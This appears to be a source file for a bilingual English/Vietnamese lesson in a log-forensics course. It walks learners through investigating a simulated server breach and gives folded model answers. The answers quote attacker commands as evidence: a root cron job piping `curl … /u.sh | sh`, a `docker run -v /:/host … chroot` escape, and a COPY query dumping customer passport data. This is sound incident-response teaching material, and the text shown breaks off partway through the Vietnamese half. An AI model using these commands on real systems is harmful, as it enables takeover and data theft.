/**
 * 18.3 — Điều tra 15 câu (soạn 24/11/2026, agent lgz). Output thật: OUT['s18/dieu-tra'] (41 khối lệnh; khối 3, 6, 7, 24, 27 là dòng "$ …" nằm trong tệp thu-thap/ của An).
 * Tệp này được GHÉP một lần từ khung + bảng đáp án (script tạm của agent); sửa trực tiếp ở đây.
 * Đáp số chính (UTC 21–22/11/2026): sqlmap 46 req 14:48:10–14:55:01 (40×400); rải SSH 35 lần 15:03:12–15:37:09 (.50/.51/.52, 12 tk ×3, deploy 2);
 * Accepted password deploy .52 15:34:17, .77 15:41:07; NOT in sudoers 15:42:31; container b0a9 15:44:30–16:21:40; cron apt-compat 15:48:01, 206 lần;
 * PTR 254 (5 tên) 15:52:40; 4625 ×16 15:56:30–15:58:06, 4740 15:57:53; cache.php Birth 16:05:44, 11 req; auth.log.1 Birth 16:19:55, mất 144 dòng, khoảng 16:19:55–17:00:02;
 * pg FATAL postgres 19:13:39, COPY khach_hang 19:14:27 (8412 ms); kh.csv.gz 19:19:12 3 486 215 B, 404 19:21:40.
 */
import { lenh, nguon, lienKet, kv } from '../_chung.mjs';

export default {
  title: '18.3 — Step 2 — Investigate: answer the 15 questions with evidence from at least four sources|||18.3 — Bước 2 — Điều tra: trả lời 15 câu hỏi với bằng chứng từ ít nhất bốn nguồn',
  slug: 'log-18-3-dieu-tra',
  type: 'LESSON',
  isFreePreview: true,
  description: 'Phần chính của dự án: đi từ tín hiệu 4740 trên máy Windows, lần ngược qua router (DNS ngược cả dải, SYN 445/3389), tên máy trạm trùng mã container Docker, về vps01 — sqlmap bị chặn, rải mật khẩu SSH xoay ba IP, deploy vào bằng mật khẩu, sudo bị từ chối nhưng nhóm docker cho lên root, cron nguỵ trang apt-compat, webshell bị sửa mtime, COPY bảng khách hàng có số hộ chiếu, tải 3,5 MB rồi xoá — và chứng minh auth.log bị sed -i (144 dòng chỉ còn trong journal, dòng mồ côi, nhịp cron đứt, Birth của tệp). Mỗi câu có cách làm, rồi lệnh + output thật + đáp án được che.',
  content: `
<div class="ml-en">
<span class="eyebrow">Chapter 18 · Capstone · 18.3</span>
<h2>Fifteen questions, one line of evidence each</h2>
<p class="lead">Work like a detective, not a search engine: start from the strongest signal (the 4740), let each answer hand you the next indicator (an IP, a name, a time), and pivot to the next source. For each question below, the <em>method</em> is visible; the commands, their real output and the expected answer are folded — open them only after you have your own.</p>

<h3>The everyday picture</h3>
<p>Pulling a thread from a sweater: you do not cut it open, you follow one loose end until it leads to the next knot.</p>

<h3>How to keep your notes</h3>
${kv([
  ['Indicators', 'Every IP, account, file, container ID, request id you find — with where you found it.'],
  ['Per question', 'Answer · evidence (file:line) · confidence (High = direct log line, Medium = inference from several, Low = assumption) · what is still unknown.'],
  ['Negative results', '"Searched X for Y, found nothing" is evidence too (Q1, Q4, Q13).'],
])}
<p>All times below are UTC. The router has already been corrected by +97 s where it matters (18.2).</p>

<h3>Q1 — PC-DEV01 on Saturday night</h3>
<p><em>Method:</em> Start from the trigger. Filter Windows events by the remote IP and by 4740; then check whether ANY network logon (4624 type 3) ever succeeded.</p>
<details><summary><strong>Commands, real output and answer</strong></summary>
${lenh('s18/dieu-tra', 0)}
${lenh('s18/dieu-tra', 1)}
<p><strong>Answer.</strong> 15:56:30Z–15:58:06Z, 16 × 4625 over SMB/NTLM (LogonType 3) from 10.8.0.1, workstation <code>B0A903430D8B</code>: <code>Administrator</code> (0xc0000072 — disabled), <code>admin</code>, <code>hoasen</code> (0xc0000064 — no such user), then <code>minh</code> × 10 (0xc000006a — wrong password) ⇒ <strong>4740 at 15:57:53Z</strong>, then 2 more refused because the account is locked (Status 0xc0000234). 4624 only from 127.0.0.1 (types 2/7 — Minh at the keyboard): <strong>no successful logon from 10.8.0.1</strong>. T1110.001 Password Guessing.</p>
</details>
<h3>Q2 — Who is 10.8.0.1, what is B0A903430D8B?</h3>
<p><em>Method:</em> Router config tells you who owns a tunnel IP. A 12-hex-digit uppercase name smells like a Docker short ID — search the vps01 journal for it, case-insensitively.</p>
<details><summary><strong>Commands, real output and answer</strong></summary>
${lenh('s18/dieu-tra', 2)}
${lenh('s18/dieu-tra', 3)}
${lenh('s18/dieu-tra', 4)}
${lenh('s18/dieu-tra', 5)}
${lenh('s18/dieu-tra', 6)}
${lenh('s18/dieu-tra', 7)}
<p><strong>Answer.</strong> 10.8.0.1 is vps01's WireGuard address, and the <code>wg</code> zone may forward to the whole LAN (<code>forward='ACCEPT'</code>, wg→lan). <code>b0a903430d8b…</code> is a container started on vps01 at 15:44:30Z and stopped at 16:21:40Z. A container's hostname defaults to its short ID; an SMB client sends its hostname as the NTLM workstation name; its traffic leaves vps01 NATed as 10.8.0.1 ⇒ the attempts on PC-DEV01 came <strong>from inside that container</strong>. Only two containers were ever started in the period: tour-api (deploy 18/11) and this one; it is not in <code>docker ps -a</code> (run with <code>--rm</code>).</p>
</details>
<h3>Q3 — What did they learn about the office?</h3>
<p><em>Method:</em> dnsmasq logs every query and where the answer came from. The firewall rule logs every new connection from the tunnel into the LAN — compare with the nightly baseline.</p>
<details><summary><strong>Commands, real output and answer</strong></summary>
${lenh('s18/dieu-tra', 8)}
${lenh('s18/dieu-tra', 9)}
<p><strong>Answer.</strong> 254 reverse (PTR) queries — the whole 10.20.0.0/24 in ~6 s (15:52:40Z after correcting the router's 97 s) — revealed 5 names: rt01, pc-dev01, pc-ketoan, nas01, dt-an (T1018). Then SYNs to 445/3389 on .15 and .16, 445/22 on .20 (T1046); 15 more to .15:445 are the SMB attempts of C1. The 9 × 873 to nas01 are the nightly rsync backup — baseline, not attack.</p>
</details>
<h3>Q4 — What did they try against the website?</h3>
<p><em>Method:</em> Look for tool User-Agents in access.log, then follow one request id into the app log, then look for SQL errors in PostgreSQL at the same time.</p>
<details><summary><strong>Commands, real output and answer</strong></summary>
${lenh('s18/dieu-tra', 10)}
${lenh('s18/dieu-tra', 11)}
${lenh('s18/dieu-tra', 12)}
<p><strong>Answer.</strong> 46 requests by <strong>sqlmap 1.9.11</strong> from 203.0.113.50, 14:48:10–14:55:01Z: 40 × 400, 6 × 200 (harmless value <code>da lat</code>). The app log for the same <code>rid</code> shows input validation rejecting the payload; PostgreSQL has <strong>no</strong> SQL errors at all (the only FATAL is Sunday's, C11). The API was not injectable. T1595.002 Vulnerability Scanning. Same IP family as the SSH spray (C5).</p>
</details>
<h3>Q5 — SSH password spraying</h3>
<p><em>Method:</em> Use the journal (it is complete). Count failures by source, then by account, then the time range.</p>
<details><summary><strong>Commands, real output and answer</strong></summary>
${lenh('s18/dieu-tra', 13)}
${lenh('s18/dieu-tra', 14)}
${lenh('s18/dieu-tra', 15)}
<p><strong>Answer.</strong> 203.0.113.50/.51/.52 (12 + 12 + 11 failures), 12 accounts × 3 rounds ~15 minutes apart, 15:03:12Z–15:37:09Z — rotating IPs to stay under per-IP limits. <code>deploy</code> has only 2 failures: its 3rd try succeeded (C6). T1110.003 Password Spraying. Internet noise (198.18.x) is ≤ 2 per IP.</p>
</details>
<h3>Q6 — The first successful entry</h3>
<p><em>Method:</em> List every Accepted line with its method and source; compare with how each account normally logs in.</p>
<details><summary><strong>Commands, real output and answer</strong></summary>
${lenh('s18/dieu-tra', 16)}
${lenh('s18/dieu-tra', 17)}
<p><strong>Answer.</strong> <strong>15:34:17Z Accepted password for deploy from 203.0.113.52</strong> — the spraying tool, which disconnected at once ("Bye Bye"); then <strong>15:41:07Z from 198.51.100.77</strong> — a human operator on a different IP. Normally <code>deploy</code> logs in only from the office (192.0.2.200) with a key. Password login was possible because <code>passwordauthentication yes</code> (cloud-init drop-in, <code>thu-thap/sshd-T.txt</code>). T1078.003 + T1133.</p>
</details>
<h3>Q7 — Was auth.log tampered with?</h3>
<p><em>Method:</em> Compare text files with the journal line by line (as multisets). Then look for orphans (lines that always come in pairs), the regular cron heartbeat, and the file's birth time.</p>
<details><summary><strong>Commands, real output and answer</strong></summary>
${lenh('s18/dieu-tra', 18)}
${lenh('s18/dieu-tra', 19)}
${lenh('s18/dieu-tra', 20)}
${lenh('s18/dieu-tra', 21)}
${lenh('s18/dieu-tra', 22)}
<p><strong>Answer.</strong> Yes. Text logs have <strong>0</strong> <code>Accepted password</code> lines; the journal has 2. 144 auth lines exist only in the journal (0 the other way): every line containing the attacker IPs, plus 5 cron sessions and the end of the deploy session. Orphans remain: 130 <code>check pass; user unknown</code> vs 109 <code>Invalid user</code> (21 orphans = the spray's invalid users), <code>New session 48/49 of user deploy</code> with no <code>Accepted</code>. Heartbeat: cron sessions every 10 minutes stop at 23:17:01 local and resume at 00:00:03 in the new file. <code>stat</code>: auth.log.1 born <strong>16:19:55Z</strong> (Birth = Modify) — the file was re-created by <code>sed -i</code>; rsyslog kept writing into the old, deleted inode until the logrotate HUP at 17:00:02Z, so <strong>16:19:55–17:00:02Z is lost</strong> in the text file, on top of the deleted IP lines. T1685.006.</p>
</details>
<h3>Q8 — How did they become root?</h3>
<p><em>Method:</em> What did deploy try first? What groups is deploy in? What happened on the host two minutes later?</p>
<details><summary><strong>Commands, real output and answer</strong></summary>
${lenh('s18/dieu-tra', 23)}
${lenh('s18/dieu-tra', 24)}
${lenh('s18/dieu-tra', 25)}
<p><strong>Answer.</strong> 15:42:31Z <code>deploy : user NOT in sudoers</code> — sudo failed. But <code>deploy</code> is in group <strong>docker</strong>, and anyone who can talk to the Docker daemon is root on the host (Docker docs). Two minutes later (15:44:30Z) container <code>b0a9…</code> starts and lives until 16:21:40Z, 30 s before deploy's session ends. The exact command is not logged (no auditd) — the classic is <code>docker run -v /:/host … chroot /host</code>; root-owned changes during that window (C9 cron file at 15:47:12Z, C10 web shell at 16:05:44Z) support it. T1611 Escape to Host. Confidence: High that it was via Docker, Medium on the exact command.</p>
</details>
<h3>Q9 — Persistence</h3>
<p><em>Method:</em> cron logs when it (re)loads a file and every command it runs. The admin also collected the directory listing.</p>
<details><summary><strong>Commands, real output and answer</strong></summary>
${lenh('s18/dieu-tra', 26)}
${lenh('s18/dieu-tra', 27)}
${lenh('s18/dieu-tra', 28)}
<p><strong>Answer.</strong> <code>/etc/cron.d/apt-compat</code> (root, mtime 15:47:12Z), loaded at 15:48:01Z: every 10 minutes as root <code>curl -fsS http://cdn-update.example.net/u.sh | sh</code>. First run 15:50:01Z, last 02:00:01Z on 23/11 — <strong>206 runs</strong>. The name imitates Ubuntu's real <code>/etc/cron.daily/apt-compat</code> (T1036.005); T1053.003 + T1105. What <code>u.sh</code> did each time is <strong>unknown</strong> — no command, DNS or egress logs on vps01.</p>
</details>
<h3>Q10 — The web shell</h3>
<p><em>Method:</em> A PHP file in an uploads folder answered by one IP only. Compare its access log with the file metadata, and read the PHP warning carefully.</p>
<details><summary><strong>Commands, real output and answer</strong></summary>
${lenh('s18/dieu-tra', 29)}
${lenh('s18/dieu-tra', 30)}
${lenh('s18/dieu-tra', 31)}
<p><strong>Answer.</strong> <code>/blog/wp-content/uploads/2026/11/cache.php</code>: 11 requests, all from 198.51.100.77 (1 GET + 10 POST), 16:06:02Z → 19:31:20Z. <code>stat</code>: Modify 2026-11-02 (fake — T1070.006 Timestomp) but <strong>Birth 16:05:44Z</strong>, during the root container's life. error.log: a one-line PHP reading POST key <code>c</code> — commands travel in the body, so access.log cannot show them. T1505.003.</p>
</details>
<h3>Q11 — The database</h3>
<p><em>Method:</em> Group connections by user and application_name, then by source address. Who normally uses tour_app?</p>
<details><summary><strong>Commands, real output and answer</strong></summary>
${lenh('s18/dieu-tra', 32)}
${lenh('s18/dieu-tra', 33)}
${lenh('s18/dieu-tra', 34)}
${lenh('s18/dieu-tra', 35)}
<p><strong>Answer.</strong> Baseline: <code>tour_app</code> only from the app (application_name <code>tour-api</code>, 172.18.0.3); <code>tour_admin</code> via DBeaver on Tue/Thu mornings. Anomaly: 19:13:39Z FATAL password for <code>postgres</code>, then <strong>19:14:18Z <code>tour_app</code> + <code>psql</code></strong> from 172.18.0.1 — the Docker bridge gateway, i.e. a process <em>on the host</em> through the published port — and at 19:14:27Z <strong><code>COPY (SELECT ho_ten, email, so_dien_thoai, so_ho_chieu, ngay_sinh FROM khach_hang) TO STDOUT</code></strong>, 8.4 s. The password came from <code>/opt/tour-api/.env</code>, readable by everyone (<code>-rw-r--r--</code>, T1552.001). It was logged only because it took &gt; 1 s (<code>log_min_duration_statement</code>). T1213.006.</p>
</details>
<h3>Q12 — Did data leave?</h3>
<p><em>Method:</em> Look for large responses to the attacker's IP, and for what happened to the same URL later.</p>
<details><summary><strong>Commands, real output and answer</strong></summary>
${lenh('s18/dieu-tra', 36)}
${lenh('s18/dieu-tra', 37)}
<p><strong>Answer.</strong> <strong>19:19:12Z GET /blog/wp-content/uploads/2026/11/kh.csv.gz → 200, 3 486 215 bytes</strong> to 198.51.100.77 (curl); 19:21:40Z the same URL → 404: compressed in the web root, downloaded, deleted. T1560.001, T1041, T1070.004. Contents: names, e-mails, phone numbers, <strong>passport numbers</strong>, dates of birth of customers.</p>
</details>
<h3>Q13 — Was tour-api itself exploited?</h3>
<p><em>Method:</em> Negative evidence: count log levels and warnings, server errors, and check the window the app log covers.</p>
<details><summary><strong>Commands, real output and answer</strong></summary>
${lenh('s18/dieu-tra', 38)}
${lenh('s18/dieu-tra', 39)}
<p><strong>Answer.</strong> No sign of it: 98 warnings = 40 validation rejections (sqlmap) + 58 × 409 (tour sold out — business); 0 × 5xx in nginx. Caveat: the app log starts 18/11 10:32Z — the container was re-created at deploy and the old json-file went with it.</p>
</details>
<h3>Q14 — Logs that should have existed</h3>
<p><em>Method:</em> List what you wanted to know and could not prove.</p>
<details><summary><strong>Commands, real output and answer</strong></summary>
${lenh('s18/dieu-tra', 40)}
<p><strong>Answer.</strong> No auditd (commands run as root inside the container), no shell history, no POST bodies or PHP-FPM log (web shell commands), no DNS or egress logs on vps01 (what <code>u.sh</code> did, how many bytes went out), no Docker events (exact <code>docker run</code> arguments), no copy of auth.log off the host (would have survived <code>sed</code>), PostgreSQL only logs statements &gt; 1 s, no app log before 18/11.</p>
</details>

<h3>Q15 — Impact and fixes</h3>
<p>This is the bridge to the report (18.5): whose data, what kind, which legal duty, and what to fix first. Draft it now from Q11–Q14; the model answer is in 18.5.</p>

<h3>🛡️ Attacker's corner — the chain was made of defaults</h3>
<p>No zero-day was used. Each step abused a common default or shortcut: SSH password login left on by a cloud-init file; a deploy account in the <code>docker</code> group ("only trusted users should be allowed to control your Docker daemon" — Docker docs); a VPN tunnel allowed into the whole LAN; a world-readable <code>.env</code>; PHP executing in an uploads folder; logs kept only on the machine being attacked.</p>
${nguon('📘', 'Docker Docs — Docker Engine security', 'Docker daemon attack surface: only trusted users should control the daemon', 'https://docs.docker.com/engine/security/')}
${nguon('📘', 'MITRE ATT&CK — T1611 Escape to Host', 'Privilege Escalation via container mounts', 'https://attack.mitre.org/techniques/T1611/')}

<h3>🎤 What an interviewer will ask</h3>
<ul>
<li>"How did you link the Windows failures to the Linux server?" — tunnel IP from router config + Docker short ID used as NTLM workstation name + timing inside the container’s lifetime.</li>
<li>"auth.log looks clean. How can you tell it was edited?" — compare with the journal or a central copy, orphan lines, broken heartbeat (cron), file birth/inode change.</li>
<li>"Why is <code>docker</code> group membership a vulnerability?" — the daemon runs as root and lets you mount the host filesystem.</li>
<li>"PostgreSQL logged the COPY — would it always?" — only because it took &gt; 1 s; a fast dump would leave only the connection lines. Consider pgAudit for sensitive tables (Chapter 12).</li>
</ul>

<h3>At work</h3>
<p>Write each answer as if the customer’s lawyer will read it: what you saw, where, and how sure you are. Separate facts (log lines) from interpretation ("this is consistent with…").</p>

<h3>🧪 Practice (2–3 hours)</h3>
<ol>
<li>Answer Q1–Q14 yourself before opening any fold. Then compare and mark each of your answers right / partly / wrong.</li>
<li>Find one more piece of evidence that is not in the solutions (hint: the size of the POST responses of cache.php, or the deploy session’s end in the journal).</li>
</ol>

<h3>🗂 Key terms</h3>
${kv([
  ['Pivot', 'Using a value found in one source to search the others.'],
  ['Orphan line', 'A line whose normal partner is missing — sign of selective deletion.'],
  ['Heartbeat', 'A regular event (cron, health check) whose gap reveals missing log.'],
  ['Docker short ID', 'First 12 hex digits of a container ID; also its default hostname.'],
  ['Timestomp', 'Changing a file’s timestamps to hide when it was created.'],
])}

<h3>📌 Summary</h3>
<ul>
<li>Start from the trigger, pivot on every new indicator, write down negatives.</li>
<li>Edited logs betray themselves: compare copies, look for orphans and gaps, check file metadata.</li>
<li>Next: 18.4 puts all of this on one UTC timeline and maps it to ATT&amp;CK.</li>
</ul>
${lienKet({ khoa: 'log-tu-a-den-z', bai: 'log-14-4-xoa-dau-vet', title: 'Lesson 14.4 — Detecting log tampering', sub: 'Orphans, gaps, central copies', cta: 'Open' })}
${lienKet({ khoa: 'log-tu-a-den-z', bai: 'log-12-1-postgres-log', title: 'Lesson 12.1 — PostgreSQL logs', sub: 'log_min_duration_statement, pgAudit', cta: 'Open' })}
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 18 · Dự án cuối khoá · 18.3</span>
<h2>Mười lăm câu hỏi, mỗi câu một dòng bằng chứng</h2>
<p class="lead">Làm như thám tử, không như máy tìm kiếm: bắt đầu từ tín hiệu mạnh nhất (4740), để mỗi câu trả lời trao cho bạn dấu hiệu tiếp theo (một IP, một cái tên, một mốc giờ), rồi xoay sang nguồn kế tiếp. Ở mỗi câu, <em>cách làm</em> để mở; lệnh, output thật và đáp án được gập lại — chỉ mở khi đã có câu trả lời của mình.</p>

<h3>Liên tưởng đời thường</h3>
<p>Gỡ một sợi len từ chiếc áo: không cắt áo ra, mà lần theo một đầu sợi cho tới nút thắt kế tiếp.</p>

<h3>Ghi chép thế nào</h3>
${kv([
  ['Dấu hiệu (indicator)', 'Mọi IP, tài khoản, tệp, mã container, request id bạn tìm được — kèm chỗ tìm thấy.'],
  ['Mỗi câu hỏi', 'Câu trả lời · bằng chứng (tệp:dòng) · độ tin cậy (Cao = có dòng log trực tiếp, Trung bình = suy từ nhiều nguồn, Thấp = giả định) · điều còn chưa biết.'],
  ['Kết quả âm tính', '"Đã tìm Y trong X, không thấy" cũng là bằng chứng (câu 1, 4, 13).'],
])}
<p>Mọi mốc giờ dưới đây theo UTC. Giờ router đã cộng 97 giây ở chỗ cần (18.2).</p>

<h3>Câu 1 — PC-DEV01 tối thứ Bảy</h3>
<p><em>Cách làm:</em> Bắt đầu từ tín hiệu. Lọc sự kiện Windows theo IP từ xa và theo 4740; rồi kiểm xem có lần đăng nhập mạng (4624 loại 3) nào từng thành công không.</p>
<details><summary><strong>Lệnh, output thật và đáp án</strong></summary>
${lenh('s18/dieu-tra', 0)}
${lenh('s18/dieu-tra', 1)}
<p><strong>Đáp án.</strong> 15:56:30Z–15:58:06Z, 16 lần 4625 qua SMB/NTLM (LogonType 3) từ 10.8.0.1, máy trạm <code>B0A903430D8B</code>: <code>Administrator</code> (0xc0000072 — bị vô hiệu hoá), <code>admin</code>, <code>hoasen</code> (0xc0000064 — không có tài khoản), rồi <code>minh</code> × 10 (0xc000006a — sai mật khẩu) ⇒ <strong>4740 lúc 15:57:53Z</strong>, thêm 2 lần bị từ chối vì tài khoản đã khoá (Status 0xc0000234). 4624 chỉ đến từ 127.0.0.1 (loại 2/7 — Minh ngồi tại máy): <strong>không có lần đăng nhập thành công nào từ 10.8.0.1</strong>. T1110.001 Password Guessing.</p>
</details>
<h3>Câu 2 — 10.8.0.1 là ai, B0A903430D8B là gì?</h3>
<p><em>Cách làm:</em> Cấu hình router cho biết IP đường hầm thuộc về ai. Một tên 12 ký tự hex viết hoa có mùi mã container Docker rút gọn — tìm nó trong journal của vps01, không phân biệt hoa/thường.</p>
<details><summary><strong>Lệnh, output thật và đáp án</strong></summary>
${lenh('s18/dieu-tra', 2)}
${lenh('s18/dieu-tra', 3)}
${lenh('s18/dieu-tra', 4)}
${lenh('s18/dieu-tra', 5)}
${lenh('s18/dieu-tra', 6)}
${lenh('s18/dieu-tra', 7)}
<p><strong>Đáp án.</strong> 10.8.0.1 là địa chỉ WireGuard của vps01, và vùng <code>wg</code> được chuyển tiếp vào cả LAN (<code>forward='ACCEPT'</code>, wg→lan). <code>b0a903430d8b…</code> là một container khởi động trên vps01 lúc 15:44:30Z, dừng 16:21:40Z. Tên máy của container mặc định là mã rút gọn; trình khách SMB gửi tên máy làm “workstation name” của NTLM; lưu lượng ra khỏi vps01 được NAT thành 10.8.0.1 ⇒ các lần thử vào PC-DEV01 đến <strong>từ bên trong container đó</strong>. Cả kỳ chỉ có hai container từng khởi động: tour-api (deploy 18/11) và cái này; nó không có trong <code>docker ps -a</code> (chạy với <code>--rm</code>).</p>
</details>
<h3>Câu 3 — Chúng biết được gì về văn phòng?</h3>
<p><em>Cách làm:</em> dnsmasq ghi mọi truy vấn và câu trả lời lấy từ đâu. Luật tường lửa ghi mọi kết nối mới từ đường hầm vào LAN — so với đường nền mỗi đêm.</p>
<details><summary><strong>Lệnh, output thật và đáp án</strong></summary>
${lenh('s18/dieu-tra', 8)}
${lenh('s18/dieu-tra', 9)}
<p><strong>Đáp án.</strong> 254 truy vấn ngược (PTR) — cả dải 10.20.0.0/24 trong ~6 giây (15:52:40Z sau khi sửa lệch 97 giây của router) — lộ 5 tên: rt01, pc-dev01, pc-ketoan, nas01, dt-an (T1018). Sau đó SYN tới 445/3389 của .15 và .16, 445/22 của .20 (T1046); 15 SYN nữa vào .15:445 chính là các lần thử SMB ở câu 1. 9 lần 873 vào nas01 là sao lưu rsync mỗi đêm — đường nền, không phải tấn công.</p>
</details>
<h3>Câu 4 — Chúng thử gì vào trang web?</h3>
<p><em>Cách làm:</em> Tìm User-Agent của công cụ trong access.log, lần theo một request id sang log ứng dụng, rồi tìm lỗi SQL trong PostgreSQL cùng lúc.</p>
<details><summary><strong>Lệnh, output thật và đáp án</strong></summary>
${lenh('s18/dieu-tra', 10)}
${lenh('s18/dieu-tra', 11)}
${lenh('s18/dieu-tra', 12)}
<p><strong>Đáp án.</strong> 46 request của <strong>sqlmap 1.9.11</strong> từ 203.0.113.50, 14:48:10–14:55:01Z: 40 × 400, 6 × 200 (giá trị vô hại <code>da lat</code>). Log ứng dụng của cùng <code>rid</code> cho thấy lớp kiểm tra đầu vào từ chối payload; PostgreSQL <strong>không</strong> có lỗi SQL nào (FATAL duy nhất là của Chủ nhật, câu 11). API không bị SQL injection. T1595.002 Vulnerability Scanning. Cùng họ IP với đợt rải SSH (câu 5).</p>
</details>
<h3>Câu 5 — Rải mật khẩu SSH</h3>
<p><em>Cách làm:</em> Dùng journal (bản đầy đủ). Đếm lần hỏng theo nguồn, rồi theo tài khoản, rồi khoảng thời gian.</p>
<details><summary><strong>Lệnh, output thật và đáp án</strong></summary>
${lenh('s18/dieu-tra', 13)}
${lenh('s18/dieu-tra', 14)}
${lenh('s18/dieu-tra', 15)}
<p><strong>Đáp án.</strong> 203.0.113.50/.51/.52 (12 + 12 + 11 lần hỏng), 12 tài khoản × 3 đợt cách nhau ~15 phút, 15:03:12Z–15:37:09Z — xoay IP để mỗi IP dưới ngưỡng chặn. <code>deploy</code> chỉ hỏng 2 lần: lần thứ 3 đã thành công (câu 6). T1110.003 Password Spraying. Nhiễu Internet (198.18.x) ≤ 2 lần mỗi IP.</p>
</details>
<h3>Câu 6 — Lần vào đầu tiên</h3>
<p><em>Cách làm:</em> Liệt kê mọi dòng Accepted kèm cách đăng nhập và nguồn; so với cách mỗi tài khoản thường đăng nhập.</p>
<details><summary><strong>Lệnh, output thật và đáp án</strong></summary>
${lenh('s18/dieu-tra', 16)}
${lenh('s18/dieu-tra', 17)}
<p><strong>Đáp án.</strong> <strong>15:34:17Z Accepted password for deploy from 203.0.113.52</strong> — công cụ rải mật khẩu, ngắt ngay ("Bye Bye"); rồi <strong>15:41:07Z từ 198.51.100.77</strong> — người điều khiển ở IP khác. Bình thường <code>deploy</code> chỉ đăng nhập từ văn phòng (192.0.2.200) bằng khoá. Vào được bằng mật khẩu vì <code>passwordauthentication yes</code> (tệp cloud-init, <code>thu-thap/sshd-T.txt</code>). T1078.003 + T1133.</p>
</details>
<h3>Câu 7 — auth.log có bị sửa không?</h3>
<p><em>Cách làm:</em> So tệp chữ với journal từng dòng (như đa tập). Rồi tìm dòng mồ côi (những dòng luôn đi theo cặp), nhịp tim cron đều đặn, và thời điểm “sinh” của tệp.</p>
<details><summary><strong>Lệnh, output thật và đáp án</strong></summary>
${lenh('s18/dieu-tra', 18)}
${lenh('s18/dieu-tra', 19)}
${lenh('s18/dieu-tra', 20)}
${lenh('s18/dieu-tra', 21)}
${lenh('s18/dieu-tra', 22)}
<p><strong>Đáp án.</strong> Có. Log chữ có <strong>0</strong> dòng <code>Accepted password</code>; journal có 2. 144 dòng auth chỉ còn trong journal (chiều ngược lại 0): mọi dòng chứa IP của kẻ tấn công, cộng 5 phiên cron và phần kết thúc phiên deploy. Dòng mồ côi còn đó: 130 <code>check pass; user unknown</code> so với 109 <code>Invalid user</code> (21 mồ côi = tài khoản không tồn tại của đợt rải), <code>New session 48/49 of user deploy</code> mà không có <code>Accepted</code>. Nhịp tim: phiên cron 10 phút một lần dừng ở 23:17:01 giờ máy và chỉ có lại lúc 00:00:03 ở tệp mới. <code>stat</code>: auth.log.1 “sinh” lúc <strong>16:19:55Z</strong> (Birth = Modify) — tệp bị tạo lại bởi <code>sed -i</code>; rsyslog vẫn ghi vào inode cũ đã bị xoá cho tới lần HUP của logrotate 17:00:02Z, nên <strong>16:19:55–17:00:02Z mất hẳn</strong> trong tệp chữ, ngoài các dòng có IP bị xoá. T1685.006.</p>
</details>
<h3>Câu 8 — Chúng lên root bằng cách nào?</h3>
<p><em>Cách làm:</em> deploy thử gì đầu tiên? deploy thuộc nhóm nào? Hai phút sau trên máy chủ xảy ra gì?</p>
<details><summary><strong>Lệnh, output thật và đáp án</strong></summary>
${lenh('s18/dieu-tra', 23)}
${lenh('s18/dieu-tra', 24)}
${lenh('s18/dieu-tra', 25)}
<p><strong>Đáp án.</strong> 15:42:31Z <code>deploy : user NOT in sudoers</code> — sudo thất bại. Nhưng <code>deploy</code> thuộc nhóm <strong>docker</strong>, và ai ra lệnh được cho Docker daemon là root trên máy (tài liệu Docker). Hai phút sau (15:44:30Z) container <code>b0a9…</code> khởi động, sống tới 16:21:40Z, 30 giây trước khi phiên deploy kết thúc. Lệnh chính xác không được ghi (không có auditd) — kiểu kinh điển là <code>docker run -v /:/host … chroot /host</code>; các thay đổi của root trong khoảng đó (tệp cron câu 9 lúc 15:47:12Z, webshell câu 10 lúc 16:05:44Z) ủng hộ điều này. T1611 Escape to Host. Độ tin cậy: Cao về việc dùng Docker, Trung bình về lệnh cụ thể.</p>
</details>
<h3>Câu 9 — Bám trụ</h3>
<p><em>Cách làm:</em> cron ghi khi nạp (lại) một tệp và mọi lệnh nó chạy. Quản trị viên cũng đã thu danh sách thư mục.</p>
<details><summary><strong>Lệnh, output thật và đáp án</strong></summary>
${lenh('s18/dieu-tra', 26)}
${lenh('s18/dieu-tra', 27)}
${lenh('s18/dieu-tra', 28)}
<p><strong>Đáp án.</strong> <code>/etc/cron.d/apt-compat</code> (root, mtime 15:47:12Z), được nạp lúc 15:48:01Z: 10 phút một lần với quyền root <code>curl -fsS http://cdn-update.example.net/u.sh | sh</code>. Lần đầu 15:50:01Z, lần cuối 02:00:01Z ngày 23/11 — <strong>206 lần</strong>. Tên bắt chước tệp thật <code>/etc/cron.daily/apt-compat</code> của Ubuntu (T1036.005); T1053.003 + T1105. Mỗi lần <code>u.sh</code> làm gì thì <strong>không xác định</strong> — vps01 không có log lệnh, DNS hay lưu lượng ra.</p>
</details>
<h3>Câu 10 — Webshell</h3>
<p><em>Cách làm:</em> Một tệp PHP trong thư mục uploads chỉ một IP gọi. So access log với siêu dữ liệu của tệp, và đọc kỹ cảnh báo PHP.</p>
<details><summary><strong>Lệnh, output thật và đáp án</strong></summary>
${lenh('s18/dieu-tra', 29)}
${lenh('s18/dieu-tra', 30)}
${lenh('s18/dieu-tra', 31)}
<p><strong>Đáp án.</strong> <code>/blog/wp-content/uploads/2026/11/cache.php</code>: 11 request, đều từ 198.51.100.77 (1 GET + 10 POST), 16:06:02Z → 19:31:20Z. <code>stat</code>: Modify 2026-11-02 (giả — T1070.006 Timestomp) nhưng <strong>Birth 16:05:44Z</strong>, đúng lúc container root đang chạy. error.log: một dòng PHP đọc khoá POST <code>c</code> — lệnh đi trong thân request nên access.log không thể thấy. T1505.003.</p>
</details>
<h3>Câu 11 — Cơ sở dữ liệu</h3>
<p><em>Cách làm:</em> Gom kết nối theo user và application_name, rồi theo địa chỉ nguồn. Bình thường ai dùng tour_app?</p>
<details><summary><strong>Lệnh, output thật và đáp án</strong></summary>
${lenh('s18/dieu-tra', 32)}
${lenh('s18/dieu-tra', 33)}
${lenh('s18/dieu-tra', 34)}
${lenh('s18/dieu-tra', 35)}
<p><strong>Đáp án.</strong> Đường nền: <code>tour_app</code> chỉ đến từ ứng dụng (application_name <code>tour-api</code>, 172.18.0.3); <code>tour_admin</code> qua DBeaver sáng thứ Ba/Năm. Bất thường: 19:13:39Z FATAL sai mật khẩu <code>postgres</code>, rồi <strong>19:14:18Z <code>tour_app</code> + <code>psql</code></strong> từ 172.18.0.1 — cổng mạng bridge của Docker, tức một tiến trình <em>trên chính máy chủ</em> đi qua cổng được publish — và lúc 19:14:27Z <strong><code>COPY (SELECT ho_ten, email, so_dien_thoai, so_ho_chieu, ngay_sinh FROM khach_hang) TO STDOUT</code></strong>, 8,4 giây. Mật khẩu lấy từ <code>/opt/tour-api/.env</code>, ai cũng đọc được (<code>-rw-r--r--</code>, T1552.001). Câu lệnh được ghi lại chỉ vì chạy &gt; 1 giây (<code>log_min_duration_statement</code>). T1213.006.</p>
</details>
